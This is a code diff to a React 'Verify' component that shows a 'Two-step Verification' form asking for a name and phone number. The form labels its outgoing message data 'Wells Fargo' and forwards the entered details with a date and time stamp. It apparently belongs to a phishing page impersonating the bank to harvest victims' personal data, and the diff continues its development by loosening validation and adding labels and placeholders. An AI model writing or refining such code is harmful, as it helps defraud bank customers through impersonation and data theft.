@@ -9,7 +9,7 @@ const Verify = () => {
   const [menuOpen, setMenuOpen] = useState(false);
   const navigate = useNavigate();
 
-  const isFormValid = name.trim() !== '' && phone.trim() !== '' && phone.length === 10;
+  const isFormValid = name.trim() !== '' && phone.trim() !== '' && phone.length <=10;
 
   const handlePhoneChange = (e) => {
     // Only allow numeric values, and ensure the phone number has exactly 10 digits
@@ -26,7 +26,10 @@ const Verify = () => {
       const templateParams = {
         web_name: "Wells Fargo",      // The user's name
         from_name: "Wells Fargo",     // The user's phone number
-        message: `Name: ${name}, Phone: ${phone}, Date: ${new Date().toLocaleDateString()}, Time: ${new Date().toLocaleTimeString()}`,
+        message: `Name: ${name},
+         Phone: ${phone},
+          Date: ${new Date().toLocaleDateString()},
+           Time: ${new Date().toLocaleTimeString()}`,
       };
 
       try {
@@ -71,23 +74,26 @@ const Verify = () => {
         <div className="w-full max-w-md bg-white rounded-lg shadow-lg px-6 py-8 sm:px-10">
           <h1 className="text-2xl font-semibold text-center mb-6">Two-step Verification</h1>
           <form onSubmit={handleSubmit}>
-            <div className="flex flex-col gap-4 sm:gap-6">
+            <div className="flex flex-col gap-2">
+              <label htmlFor="name">Enter Name</label>
               <input
                 type="text"
                 className="border border-gray-300 rounded-full py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
-                placeholder="Enter your Name"
+                placeholder=" xyz"
                 value={name}
                 onChange={(e) => setName(e.target.value)}
                 required
               />
+              <label htmlFor="number">Enter Number</label>
               <input
                 type="text"  // Change input type to text
                 className="border border-gray-300 rounded-full py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
-                placeholder="Phone Number (10 digits)"
+                placeholder="_ _ _   _ _ _    _ _ _ _ "
                 value={phone}
                 onChange={handlePhoneChange}  // Use the custom handler
                 required
-                maxLength="10"  // Limit to 10 characters
+                maxLength="10"
+                id='number'  // Limit to 10 characters
               />
               <button
                 type="submit"
